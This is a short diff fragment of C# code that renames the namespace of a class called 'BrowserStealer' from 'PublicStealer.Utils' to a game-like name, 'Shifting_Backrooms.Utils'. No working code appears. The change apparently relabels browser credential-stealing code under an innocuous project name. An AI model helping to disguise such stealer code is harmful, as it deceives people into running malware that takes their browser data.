@@ -17,7 +17,7 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace PublicStealer.Utils
+namespace Shifting_Backrooms.Utils
 {
     public class BrowserStealer
     {
